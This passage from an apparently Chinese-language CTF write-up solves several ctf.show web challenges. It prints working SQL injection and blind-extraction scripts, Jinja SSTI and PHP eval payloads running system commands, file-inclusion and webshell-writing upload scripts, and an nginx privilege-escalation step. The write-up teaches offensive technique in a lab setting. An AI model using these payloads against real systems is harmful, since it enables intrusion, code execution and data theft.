&#123;</span><br><span class="line">			$username=substr($username,0,10);</span><br><span class="line">		&#125;</span><br><span class="line">		echo &quot;Hello $username,there&#x27;s nothing here but dog food!&quot;;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到要求：</p>
<ul>
<li>username部分必须是数字</li>
<li>在注册功能的waf是明显少很多的</li>
</ul>
<p>登陆成功之后，如果username是纯数字，则会直接输出username的值出来</p>
<p>所以可以构造username&#x3D;select(flag&#x2F;**&#x2F;from&#x2F;**&#x2F;flag)，如果要让他变成纯数字并且ascii被ban的情况下，可以使用两层hex函数，第一步将原文转化为16进制，由于16进制含ABCDEF，再套一层可以保证全是数字</p>
<p>所以要考虑如何逃逸出<code>username = &#39;$u&#39;</code></p>
<p>简单在$e中多拼接一个<code>&#39;</code>，后面跟上payload</p>
<p>但是由于换行的限制，在$e中传入的payload处在同行，所以需要用&#x2F;**&#x2F;的操作来注释多行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">如果不使用/**/，仅用#是无法将换行后的username和password注释掉的</span><br><span class="line">insert into test1</span><br><span class="line">set email = &#x27;1&#x27;,username/**/=/**/hex(hex(substr((select/**/flag/**/from/**/flag),12,1))),password/**/=/**/&#x27;pass&#x27;#&#x27;, </span><br><span class="line">username = &#x27;user&#x27;,</span><br><span class="line">password = &#x27;pass&#x27;</span><br><span class="line">成功的打法</span><br><span class="line">insert into test1</span><br><span class="line">set email = &#x27;1&#x27;,username/**/=/**/hex(hex(substr((select/**/flag/**/from/**/flag),12,1))),/*&#x27;, </span><br><span class="line">username = &#x27;user*/#&#x27;,</span><br><span class="line">password = &#x27;pass&#x27;</span><br></pre></td></tr></table></figure>

<p>这样的打法就成功将第三行的username注释掉了，再使用一个#注释后面的<code>&#39;#</code></p>
<p>所以一个poc就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e=1&#x27;,username/**/=/**/hex(hex(substr((select/**/flag/**/from/**/flag),12,1))),/*</span><br><span class="line">&amp;u=*/#</span><br><span class="line">&amp;p=pass</span><br></pre></td></tr></table></figure>

<p>给出一个脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url1 = &quot;http://7bc05111-4ec7-4214-81c9-4e8e0c259385.challenge.ctf.show/register.php&quot;</span><br><span class="line">url2 = &quot;http://7bc05111-4ec7-4214-81c9-4e8e0c259385.challenge.ctf.show/login.php&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1, 50):</span><br><span class="line">    payload = &quot;hex(hex(substr((select/**/flag/**/from/**/flag),&#123;&#125;,1)))&quot;.format(i)</span><br><span class="line">    print(payload)</span><br><span class="line">    s = requests.session()</span><br><span class="line">    data1 = &#123;</span><br><span class="line">        &quot;e&quot;: str(i) + &quot;&#x27;,username=&quot; + payload + &quot;,/*&quot;,</span><br><span class="line">        &quot;u&quot;: &quot;*/#&quot;,</span><br><span class="line">        &quot;p&quot;: i</span><br><span class="line">    &#125;</span><br><span class="line">    r1 = s.post(url1, data = data1)</span><br><span class="line">    data2 = &#123;</span><br><span class="line">        &quot;e&quot;: str(i),</span><br><span class="line">        &quot;p&quot;: i</span><br><span class="line">    &#125;</span><br><span class="line">    r2 = s.post(url2, data = data2)</span><br><span class="line">    t = r2.text</span><br><span class="line">    real = re.findall(&quot;Hello (.*?),&quot;, t)[0]</span><br><span class="line">    flag += real</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>

<p>得到flag的双重hex转string即可</p>
<h2 id="出题人不想跟你说话-jpg"><a href="#出题人不想跟你说话-jpg" class="headerlink" title="出题人不想跟你说话.jpg"></a>出题人不想跟你说话.jpg</h2><p>变成提权了</p>
<p>进去一张图，提示cai和菜刀</p>
<p>直接蚁剑连上去，密码cai</p>
<p>但是进去的用户是www-data，需要考虑提权</p>
<p>hint提示去看看什么服务</p>
<p>直接<code>cat /etc/crontab</code>看看有什么服务</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202312101912715.png" alt="image-20231210191207659"></p>
<p>每分钟执行一次<code>/usr/sbin/logrotate -vf /etc/logrotate.d/nginx</code></p>
<p>蚁剑的终端太傻逼了，反弹个shell到攻击机上</p>
<p>已经提示是nginx服务+提权了，直接有<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/40768">CVE-2016-1247</a></p>
<p>exp搞下来执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod -R 777 ./nginx.sh</span><br><span class="line">./nginx.sh /var/log/nginx/error.log</span><br></pre></td></tr></table></figure>

<p>等待一分钟crontab自动执行后提权</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202312101915632.png" alt="image-20231210191545599"></p>
<h2 id="蓝瘦"><a href="#蓝瘦" class="headerlink" title="蓝瘦"></a>蓝瘦</h2><p>看一眼session一眼flask session伪造</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202312101928773.png" alt="image-20231210192814717"></p>
<p>F12给key: ican，直接伪造</p>
<p>打进去提示<code>缺少请求参数！</code></p>
<p>首页还有个param: ctfshow，传个值进去回显</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202312101941359.png" alt="image-20231210194113312"></p>
<p>ssti直接梭，0过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctfshow=&#123;%for(x)in().__class__.__base__.__subclasses__()%&#125;&#123;%if&#x27;war&#x27;in(x).__name__ %&#125;&#123;&#123;x()._module.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;env&#x27;).read()&#125;&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>

<h2 id="一览无余"><a href="#一览无余" class="headerlink" title="一览无余"></a>一览无余</h2><p>CVE-2019-11043</p>
<p>特点nginx&#x2F;1.20.1</p>
<p>拿phuip-fpizdam直接打</p>
<h2 id="登陆就有flag"><a href="#登陆就有flag" class="headerlink" title="登陆就有flag"></a>登陆就有flag</h2><p>考察的点是mysql的隐式类型转换</p>
<p>当输入<code>&#39;3&#39;-&#39;1&#39;</code>时，mysql引擎会把<code>&#39;&#39;</code>包含的当做数字进行减法运算</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202401272232185.png" alt="image-20240127223155075"></p>
<p>fuzz之后可用的特殊字符串有<code>!#$&amp;&#39;./:&lt;&gt;?@[]^_&#123;&#125;</code></p>
<p>显然，可以用&amp; ^来进行操作</p>
<p><code>select &#39;&#39;^&#39;&#39;</code>和<code>select &#39;&#39;&amp;&#39;&#39;</code>的结果均为0，而sql的select语句又有个特点，指定<code>where=0</code>时，会查询所有非数字开头的记录</p>
<p>所以就直接打一个<code>select * from flag where u=&#39;&#39;^&#39;&#39;#</code>的payload即可</p>
<p>市赛海燕那个也能这么打<code>&#39;*&#39;</code></p>
<h2 id="签退"><a href="#签退" class="headerlink" title="签退"></a>签退</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php ($S = $_GET[&#x27;S&#x27;])?eval(&quot;$$S&quot;):highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>

<p>eval中可利用<code>;</code>进行多php语句操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?S=a;system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>

<p>预期解是变量覆盖</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?S=S=system(&#x27;cat ../flag.txt&#x27;);</span><br><span class="line">或者</span><br><span class="line">?S=a=system(&#x27;cat ../flag.txt&#x27;);</span><br></pre></td></tr></table></figure>

<p>也有这种打法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?S=_POST[&#x27;1&#x27;]($_POST[&#x27;2&#x27;]);</span><br><span class="line">1=system&amp;2=ls</span><br></pre></td></tr></table></figure>

<h2 id="不知所措-jpg"><a href="#不知所措-jpg" class="headerlink" title="不知所措.jpg"></a>不知所措.jpg</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file must has test</span><br></pre></td></tr></table></figure>

<p>必须带test字眼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=test.</span><br></pre></td></tr></table></figure>

<p>打过去提示flag not here，估计是一层文件包含</p>
<p>伪协议直接打</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=test.</span><br></pre></td></tr></table></figure>

<p>这里有一个tips</p>
<blockquote>
<h4 id="php-x2F-x2F-filter-¶"><a href="#php-x2F-x2F-filter-¶" class="headerlink" title="php:&#x2F;&#x2F;filter ¶"></a>php:&#x2F;&#x2F;filter<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php.php#wrappers.php.filter"> ¶</a></h4><p>php:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.php">筛选过滤</a>应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.readfile.php">readfile()</a>、 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.file.php">file()</a> 和 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.file-get-contents.php">file_get_contents()</a>， 在数据流内容读取之前没有机会应用其他过滤器。</p>
<p>php:&#x2F;&#x2F;filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。</p>
<table>
<thead>
<tr>
<th align="left">名称</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>resource=&lt;要过滤的数据流&gt;</code></td>
<td align="left">这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
</tr>
<tr>
<td align="left"><code>read=&lt;读链的筛选列表&gt;</code></td>
<td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;</td>
</tr>
<tr>
<td align="left"><code>write=&lt;写链的筛选列表&gt;</code></td>
<td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;</td>
</tr>
<tr>
<td align="left"><code>&lt;；两个链的筛选列表&gt;</code></td>
<td align="left">任何没有以 <code>read=</code> 或 <code>write=</code> 作前缀 的筛选器列表会视情况应用于读或写链。</td>
</tr>
</tbody></table>
</blockquote>
<p>在read和resource中间可以任意插入，不影响数据的读取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/test/resource=test.</span><br></pre></td></tr></table></figure>

<p>在这里加入test后不影响</p>
<p>所以可以通过这个来读index</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/test/resource=index.</span><br></pre></td></tr></table></figure>

<p>打出来确实是include，那就直接data打</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php system(&#x27;ls&#x27;);echo &#x27;test&#x27;; ?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="easyshell"><a href="#easyshell" class="headerlink" title="easyshell"></a>easyshell</h2><p>进入让传个username和password，cookie还带了hash，合理猜测这三个相关</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5($secret.$name)===$pass</span><br></pre></td></tr></table></figure>

<p>传username&#x3D;1，password&#x3D;hash，发现通过<code>window.location.href</code>自动跳转了两个页面：flflflflag.php，404.html</p>
<p>进burp一步步看，在flflflflag中提示了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include($_GET[&quot;file&quot;])</span><br></pre></td></tr></table></figure>

<p>既然都include，直接php伪协议把源码读出来</p>
<p>flflflflag.php:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123;</span><br><span class="line">    die(&#x27;nonono&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">@include($file);</span><br><span class="line">echo &#x27;include($_GET[&quot;file&quot;])&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>也就这里的文件包含能利用了</p>
<h3 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h3><p>有个知识点：</p>
<blockquote>
<p>PHP可以通过POST或者PUT进行文件上传，上传的文件存在临时文件的存储目录中，在一个正常存活周期后删除</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202401300030285.png" alt="临时文件正常的存货周期"></p>
<p>上面这张图是PHP在通过POST方法上传文件时的运行周期图，可以看到我们临时文件的存活周期就是上图红色框中的时间段。另外，如果在php运行的过程中，假如php非正常结束，比如崩溃，那么这个临时文件就会永久的保留。如果php正常的结束，并且该文件没有被移动到其它地方也没有被改名，则该文件将在表单请求结束时被删除。</p>
<p>根据@王一航师傅去年的一个发现，利用<strong>php:&#x2F;&#x2F;filter&#x2F;string.strip_tags</strong>造成崩溃。在含有文件包含漏洞的地方，使用<strong>php:&#x2F;&#x2F;filter&#x2F;string.strip_tags</strong>导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录</p>
</blockquote>
<p>经过文件扫描后还发现了个dir.php，里面就是var_dump了&#x2F;tmp的目录</p>
<p>那就可以猜测tmp目录就是&#x2F;tmp下</p>
<p>给一个python的文件上传脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def upload_file_to_url(url, file_content, file_name):</span><br><span class="line">    file_data = io.BytesIO(file_content.encode())</span><br><span class="line"></span><br><span class="line">    files = &#123;&#x27;file&#x27;: (file_name, file_data)&#125;</span><br><span class="line"></span><br><span class="line">    response = requests.post(url, files=files)</span><br><span class="line"></span><br><span class="line">    print(response.text)</span><br><span class="line"></span><br><span class="line">target_url = &#x27;http://43f8f4c1-7229-4348-8c40-e5858b937637.challenge.ctf.show/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#x27;</span><br><span class="line">content_to_upload = &#x27;&lt;?php file_put_contents(&quot;shell.php&quot;,&quot;&lt;?php phpinfo();?&gt;&quot;)?&gt;&#x27;</span><br><span class="line">file_name_to_upload = &#x27;test&#x27;</span><br><span class="line"></span><br><span class="line">upload_file_to_url(target_url, content_to_upload, file_name_to_upload)</span><br></pre></td></tr></table></figure>

<p>里面使用<code>php://filter/string.strip_tags</code>来造成崩溃，再访问dir.php即可找到该文件的名字</p>
<p>这个文件被包含的结果就是，创建一个shell.php，往里面写入<code>&lt;?php phpinfo();?&gt;</code></p>
<p>include包含之后直接访问shell.php</p>
<h3 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h3><p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9545">浅谈 SESSION_UPLOAD_PROGRESS 的利用</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/201177">LFI 绕过 Session 包含限制 Getshell</a></p>
<blockquote>
<p>Session Upload Progress 最初是PHP为上传进度条设计的一个功能，在上传文件较大的情况下，PHP将进行流式上传，并将进度信息放在Session中，此时即使用户没有初始化Session，PHP也会自动初始化Session。而且，默认情况下session.upload_progress.enabled是为On的，也就是说这个特性默认开启。</p>
</blockquote>
<p>思路是一样的，包含一个恶意文件，只不过这个恶意文件由session upload得来</p>
<h2 id="给你shell"><a href="#给你shell" class="headerlink" title="给你shell"></a>给你shell</h2><p>F12提示传参<code>?view_source</code>，进去显示源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//It&#x27;s no need to use scanner. Of course if you want, but u will find nothing.</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;view_source&#x27;])) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function checkCookie($s) &#123;</span><br><span class="line">    $arr = explode(&#x27;:&#x27;, $s);</span><br><span class="line">    if ($arr[0] === &#x27;&#123;&quot;secret&quot;&#x27; &amp;&amp; preg_match(&#x27;/^[\&quot;0-9A-Z]*&#125;$/&#x27;, $arr[1]) &amp;&amp; count($arr) === 2 ) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if ( !theFirstTimeSetCookie() ) setcookie(&#x27;secret&#x27;, &#x27;&#x27;, time()-1);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function haveFun($_f_g) &#123;</span><br><span class="line">    $_g_r = 32;</span><br><span class="line">    $_m_u = md5($_f_g);</span><br><span class="line">    $_h_p = strtoupper($_m_u);</span><br><span class="line">    for ($i = 0; $i &lt; $_g_r; $i++) &#123;</span><br><span class="line">        $_i = substr($_h_p, $i, 1);</span><br><span class="line">        $_i = ord($_i);</span><br><span class="line">        print_r($_i &amp; 0xC0);</span><br><span class="line">    &#125;</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isset($_COOKIE[&#x27;secret&#x27;]) ? $json = $_COOKIE[&#x27;secret&#x27;] : setcookie(&#x27;secret&#x27;, &#x27;&#123;&quot;secret&quot;:&quot;&#x27; . strtoupper(md5(&#x27;y1ng&#x27;)) . &#x27;&quot;&#125;&#x27;, time()+7200 );</span><br><span class="line">checkCookie($json) ? $obj = @json_decode($json, true) : die(&#x27;no&#x27;);</span><br><span class="line"></span><br><span class="line">if ($obj &amp;&amp; isset($_GET[&#x27;give_me_shell&#x27;])) &#123;</span><br><span class="line">    ($obj[&#x27;secret&#x27;] != $flag_md5 ) ? haveFun($flag) : echo &quot;here is your webshell: $shell_path&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">die;</span><br></pre></td></tr></table></figure>

<p>处理流程：如果cookie中设置了secret，赋值给$json，否则给你加上个md5(‘y1ng’)作为cookie</p>
<p>正常情况下cookie的secret为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">secret=%7B%22secret%22%3A%22770F0F8B605CFD2BA494849D948D34EF%22%7D</span><br><span class="line">urldecode-&gt;</span><br><span class="line">secret=&#123;&quot;secret&quot;:&quot;770F0F8B605CFD2BA494849D948D34EF&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>进入checkCookie函数，要求$json<code>:</code>前为<code>&#123;&quot;secret&quot;</code>，后半部分<code>[\&quot;0-9A-Z]*</code>且以<code>&#125;</code>结尾</p>
<p>往后就是$obj接收$json经过json_decode的内容</p>
<p>如果$obj[‘secret’]！&#x3D;$flag_md5，就进haveFun函数，里面就是把flag md5后转大写，然后每位都和0xC0异或</p>
<p>测试出来haveFun的输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0006464640064064646464006406464064640064006400000000000</span><br></pre></td></tr></table></figure>

<p>再试试会发现输出有规律：数字-&gt;0，字母-&gt;64</p>
<p>所以flag md5后的前三个一定是数字</p>
<p>利用php弱比较，数字和数字开头的str比较，str会自动截取，让str转为数字再比较</p>
<p>让<code>secret=&#123;&quot;secret&quot;:123&#125;</code>，其中123会被json_decode解析为数字，在这里爆破得到115</p>
<p>进下一步path</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">require &quot;hidden_filter.php&quot;;</span><br><span class="line"></span><br><span class="line">if (!$_SESSION[&#x27;login&#x27;])</span><br><span class="line">    die(&#x27;&lt;script&gt;location.href=\&#x27;./index.php\&#x27;&lt;/script&gt;&#x27;);</span><br><span class="line"></span><br><span class="line">if (!isset($_GET[&#x27;code&#x27;])) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">    exit();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $code = $_GET[&#x27;code&#x27;];</span><br><span class="line">    if (!preg_match($secret_waf, $code)) &#123;</span><br><span class="line">        //清空session 从头再来</span><br><span class="line">        eval(&quot;\$_SESSION[&quot; . $code . &quot;]=false;&quot;); //you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker</span><br><span class="line">    &#125; else die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>fuzz一通被ban了&#96;&#96;fF”$’()*+&#x2F;;^|&#96;</p>
<p>直接php短标签提前闭合，造成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;\$_SESSION[1]?&gt;&lt;?=?&gt;]=false;&quot;);</span><br></pre></td></tr></table></figure>

<p>接下来要考虑怎么样在新开的标签里读到flag.txt，而且F,f都被ban了，括号也ban了，基本调用不到函数</p>
<p>可以用require来包含(include被ban)，加上个~取反来绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo urlencode(~&quot;/flag.txt&quot;)-&gt;%d0%99%93%9e%98%d1%8b%87%8b</span><br><span class="line">echo urlencode(~&quot;/flag&quot;)-&gt;%d0%99%93%9e%98</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1]?&gt;&lt;?=require~%d0%99%93%9e%98?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="RemoteImageDownloader"><a href="#RemoteImageDownloader" class="headerlink" title="RemoteImageDownloader"></a>RemoteImageDownloader</h2><p>一眼过去觉得是php+curl，想着file协议直接拿下了</p>
<p>但是测试了发现并不是php，起一个HTTP HEARDER ECHO服务看看UA头得到后端的请求</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    from http.server import HTTPServer, BaseHTTPRequestHandler</span><br><span class="line">except:</span><br><span class="line">    from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler</span><br><span class="line">from optparse import OptionParser</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">class RequestHandler(BaseHTTPRequestHandler):</span><br><span class="line"></span><br><span class="line">    def do_GET(self):</span><br><span class="line">        request_path = self.path</span><br><span class="line"></span><br><span class="line">        self.send_response(200)</span><br><span class="line">        self.send_header(&#x27;Content-Type&#x27;, &#x27;application/json&#x27;)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        json_string = json.dumps(dict(self.headers))</span><br><span class="line">        self.wfile.write(json_string.encode(&#x27;utf-8&#x27;))</span><br><span class="line"></span><br><span class="line">        print(&#x27;%sBegin of Headers%s&#x27; % (&#x27;-&#x27; * 5, &#x27;-&#x27; * 5))</span><br><span class="line">        for k, v in self.headers.items():</span><br><span class="line">            print(&#x27;%s: %s&#x27; % (k, v))</span><br><span class="line">        print(&#x27;%sEnd of Headers%s&#x27; % (&#x27;-&#x27; * 5, &#x27;-&#x27; * 5))</span><br><span class="line"></span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">    do_POST   = do_GET</span><br><span class="line">    do_PUT    = do_GET</span><br><span class="line">    do_DELETE = do_GET</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    port = 8080</span><br><span class="line">    print(&#x27;Listening on all interfaces:%s&#x27; % port)</span><br><span class="line">    server = HTTPServer((&#x27;&#x27;, port), RequestHandler)</span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    parser = OptionParser()</span><br><span class="line">    parser.usage = (&quot;Creates an HTTP-header-echo-server.&quot;)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402042314535.png" alt="image-20240204231410411"></p>
<p>PhantomJS2.1.1有<a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2019-17221">CVE-2019-17221</a></p>
